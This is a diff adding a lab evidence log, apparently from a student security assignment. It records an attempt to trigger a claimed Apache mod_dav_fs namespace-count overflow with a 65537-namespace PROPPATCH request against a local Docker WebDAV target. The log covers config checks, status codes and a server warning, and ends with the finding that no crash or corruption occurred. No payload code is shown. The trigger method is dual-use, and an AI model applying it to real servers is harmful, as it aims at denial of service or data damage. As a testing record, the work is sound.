@@ -1,0 +1,29 @@
+# Scenario 3 — CVE-2026-93546 · mod_dav_fs namespace-count overflow (PROPPATCH)
+# target: http://127.0.0.1:8080/webdav/   (2026-10-26 16:15 UTC)
+
+## 5.2 Confirm the lab-only large-body allowance is in effect
+$ docker exec acw3-target grep -n 'LimitXMLRequestBody\|Dav On' /usr/local/apache2/conf/lab-vuln.conf
+82:    Dav On
+85:    LimitXMLRequestBody 0
+
+## 5.3 Benign control PROPFIND (expect 207 Multi-Status)
+Control PROPFIND HTTP status: 207
+
+## 5.4 Generate the namespace-heavy PROPPATCH XML (65537 distinct namespaces)
+namespaces=65537 bytes=1944046 path=/home/fokku/claude/INF2005-ACW3/report/evidence/webdav-proppatch.xml
+
+## 5.5 Send the PROPPATCH (the single trigger)
+PROPPATCH HTTP status: 207
+response (first 2 lines of status header):
+  HTTP/1.1 100 Continue
+  
+
+## 5.6 Demonstrate property-database damage (reopen resource, then collection)
+Post-trigger resource PROPFIND (Depth 0): 207
+Post-trigger collection PROPFIND (Depth 1): 207
+crash/worker-exit indicators in target log: 0
+  acw3-target  | [Mon Oct 26 16:15:17.964512 2026] [dav_fs:warn] [pid 29:tid 58] (22)Invalid argument: AH00577: Error writing propdb: Invalid argument
+
+## Verdict
+  => NO corruption/crash: property DB still serves 207 after the
+     65537-namespace PROPPATCH (no 16-bit counter wrap on this build).
